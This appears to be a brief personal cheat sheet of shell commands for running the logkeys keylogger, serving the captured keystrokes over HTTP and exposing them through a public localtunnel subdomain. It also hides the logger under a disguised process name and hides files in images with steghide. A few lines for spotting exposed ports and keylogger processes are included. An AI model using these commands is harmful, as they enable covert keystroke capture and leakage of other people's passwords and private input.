# Keylogger and expose to ftp server

sudo pacman -S logkeys
sudo logkeys -s -d event3 --output test.log                                                     ~
sudo tail --follow test.log
python -m http.server 80
lt --local-host 0.0.0.0 --port 80 --subdomain dummy987656


sudo rm -rf /var/run/logkeys.pid
sudo bash -c "exec -a temp1 logkeys -s -d event3 --output b.log &"
# Detecting network expose
ss -natu
netstat -apv

# lkl, uberkey, THC-vlogger, PyKeylogger, logkeys
ps aux | grep logkeys

#Shell in a box
https://www.geeksforgeeks.org/shell-in-a-box-remote-linux-server-via-web-browser/


bash -c "exec -a MyUniqueProcessName <command> &"


# Steganography
tar -czvf name {file/folder}
sudo apt-get update 
sudo apt install steghide 
steghide embed -ef {embedFile} -cf {coverFile} -p {Passphrase}
steghide extract -sf {ImageFile} 
